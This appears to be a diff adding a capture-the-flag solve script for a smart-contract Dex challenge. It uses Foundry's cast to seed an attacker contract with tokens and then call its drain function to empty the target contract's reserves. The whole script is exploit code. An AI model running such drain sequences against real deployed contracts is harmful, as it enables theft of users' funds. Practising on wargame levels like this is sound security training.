@@ -1,0 +1,16 @@
+#!/bin/bash
+
+set -e -o pipefail
+
+source key
+#
+CON=0x26262535762D3cd277f2fe56023D90593001c695
+
+# forge create --private-key $KEY '22.dex.sol:Kex'
+KEX=0x28703a7c5b25b58d6732fa14a62b25afae189e38
+
+TOKEN1=$(cast --to-hex $(cast --to-dec $(cast call $CON 'token1()')))
+TOKEN2=$(cast --to-hex $(cast --to-dec $(cast call $CON 'token2()')))
+cast send --private-key $KEY $TOKEN1 'transfer(address,uint)' $KEX 10
+cast send --private-key $KEY $TOKEN2 'transfer(address,uint)' $KEX 10
+cast send --private-key $KEY $KEX 'drain(address)' $CON
